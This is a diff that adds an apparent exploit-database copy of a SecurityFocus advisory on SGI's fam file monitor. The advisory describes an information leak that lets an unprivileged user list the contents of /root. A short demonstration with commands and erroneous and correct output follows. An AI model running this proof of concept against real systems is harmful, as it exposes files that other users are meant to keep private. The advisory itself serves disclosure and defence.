@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/5487/info
+
+fam is a freely available, open source file alteration monitor. It is maintained and distributed by SGI, and will work on the Linux and Unix operating systems.
+
+It is possible for a user to execute fam to discover a list of monitored files. This list, while it may have been created by a user of elevated privileges, could leak information to an attacker that may be sensitive. This vulnerability requires only that the directory being 'fammed' already have had the program executed against it by a privileged user.
+
+# ls -ld /root
+drwxr-x--- ... root root ... /root
+# fam
+
+% groups | grep root
+
+ERRONEOUS BEHAVIOR
+% ./test -d /root
+FAMMonitorDirectory("/root")
+FAMMonitorDirectory("/root")
+DIR /root: /root Exists
+DIR /root: .gnome Exists
+DIR /root: Desktop Exists
+...
+
+CORRECT BEHAVIOR
+% ./test -d /root
+FAMMonitorDirectory("/root")
+FAMMonitorDirectory("/root")
+DIR /root: /root Exists
+DIR /root: /root EndExist
+---------------------------------------- 
+(% indicates a command run as an unprivileged user)
